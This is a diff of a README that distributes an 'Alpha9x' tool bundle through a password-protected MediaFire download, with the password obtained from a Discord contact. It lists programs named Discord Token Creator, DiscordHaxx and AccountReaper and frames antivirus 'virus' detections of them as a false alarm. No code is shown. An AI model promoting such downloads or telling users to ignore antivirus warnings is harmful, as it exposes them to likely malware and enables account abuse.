@@ -13,13 +13,16 @@ Contact Fludix on Discord for the Password:
 Fludix#0453
 ```
 
-[Alpha9x v.2.56](https://www.mediafire.com/file/vst8m5w59iwmotk/Alpha9x_v2.56.zip)
+[Alpha9x v.2.57](https://www.mediafire.com/file/vst8m5w59iwmotk/Alpha9x_v2.56.zip)
 -----------------
 
 -----------------
 ### $|> Information:
 
 # 27/04/21 // 09:01 PM in Germany:
+Alpha9x Version 2.57 is now out:
+-Only fixes on AccountReaper (It didn't have any Modules)
+
 Alpha9x Version 2.56 is now out!
 The new Programs are Discord Token Creator, DiscordHaxx and AccountReaper. 
 FYI: It says that it is a "virus" with DiscordHaxx and Discord Token
